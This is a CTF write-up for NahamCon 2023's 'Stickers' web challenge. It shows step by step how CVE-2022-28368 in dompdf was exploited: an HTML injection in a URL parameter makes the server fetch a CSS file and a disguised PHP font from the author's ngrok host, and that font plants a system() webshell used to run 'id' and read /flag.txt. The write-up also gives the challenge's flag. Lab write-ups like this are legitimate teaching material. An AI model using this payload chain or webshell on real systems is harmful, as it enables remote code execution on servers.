>Wooohoo!!! Stickers!!! Hackers love STICKERS!! You can make your own with our new website!
>**Find the flag file in `/flag.txt` at the root of the filesystem.**
--------------
Visiting the website, there is a form to fill out custom information. Upon submitting data, we are generated a pdf webpage:

![Pasted image 20230616151436.png](https://github.com/spencerja/NahamConCTF_2023_Writeup/blob/main/Web/Images/Pasted%20image%2020230616151436.png)

In particular I notice the url of the page corresponds to the data I submitted:

```
http://challenge.nahamcon.com:31182/quote.php?organisation=&email=&small=0&medium=0&large=0
```

I downloaded the pdf file and decided to see if I can glean some information on how it was generated:

```
$ exiftool quote.pdf 
ExifTool Version Number         : 12.57
File Name                       : quote.pdf
Directory                       : .
File Size                       : 2.5 kB
File Modification Date/Time     : 2023:06:16 15:15:27-04:00
File Access Date/Time           : 2023:06:16 15:15:27-04:00
File Inode Change Date/Time     : 2023:06:16 15:15:27-04:00
File Permissions                : -rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.7
Linearized                      : No
Page Count                      : 1
Producer                        : dompdf 1.2.0 + CPDF
Create Date                     : 2023:06:16 19:14:20+00:00
Modify Date                     : 2023:06:16 19:14:20+00:00
Title                           : Quote
```

Immediately the producer `dompdf` stands out to me. I recognize a pretty serious vulnerability it that can lead to remote code execution [CVE-2022-28368](https://nvd.nist.gov/vuln/detail/CVE-2022-28368). 

I used [this poc post](https://github.com/positive-security/dompdf-rce) to exploit this.

Using my own `ngrok` website, I direct the payload toward myself, where it can pick up the malicious php:

```
challenge.nahamcon.com:31182/quote.php?organisation=<link rel=stylesheet href='https://91cf-50-81-86-237.ngrok-free.app/exploit.css'>&email=&small=0&medium=0&large=0
```

In the exploit_font.php, I used a simple webshell one-liner:

```shell
$ cat exploit_font.php 

� dum1�cmap
           `�,glyf5sc��head�Q6�6hhea��($hmtxD
loca
Tmaxp\ nameD�|8dum2�
                     -��-����
:83#5:08��_<�
             @�8�&۽
:8L��

:D

6                               s
<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>
```

The unreadable junk above seems to be related to the file being intended as a font style, so it was left unchanged. 

After the request is sent, I see two GET requests on my server, knowing that it was successfully retrieved:

```
HTTP Requests                                                                                                       
-------------                                                                                                       
                                                                                                                    
GET /exploit_font.php          200 OK                                                                               
GET /exploit.css               200 OK 
```

Now we need to determine the new name of the malicious php downloaded. While not thoroughly explained in the POC github, it appears that the name is based on the `md5sum` of the download link, in this case my ngrok link:

```
$ echo -ne "https://91cf-50-81-86-237.ngrok-free.app/exploit_font.php" | md5sum
88045a0e7631a2540434bb8c27d7d483  -

```


Now we visit the downloaded link under the format `/dompdf/lib/fonts/<font-family>_<style>_<md5(url)>.php`

```
challenge.nahamcon.com:31182/dompdf/lib/fonts/exploitfont_normal_88045a0e7631a2540434bb8c27d7d483.php?cmd=id
```

```
� dum1�cmap`�,glyf5sc��head�Q6�6hhea��($hmtxD Lloca Tmaxp\ nameD�|8dum2� -��-���� :83#5:08��_<�@�8�&۽ :8L�� :D 6    s

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

We do indeed see that it works! We were told the flag is located in root of the filesystem:

```
challenge.nahamcon.com:31182/dompdf/lib/fonts/exploitfont_normal_88045a0e7631a2540434bb8c27d7d483.php?cmd=cat /flag.txt
```


`flag{a4d52beabcfdeb6ba79fc08709bb5508}`

- Author : Tien
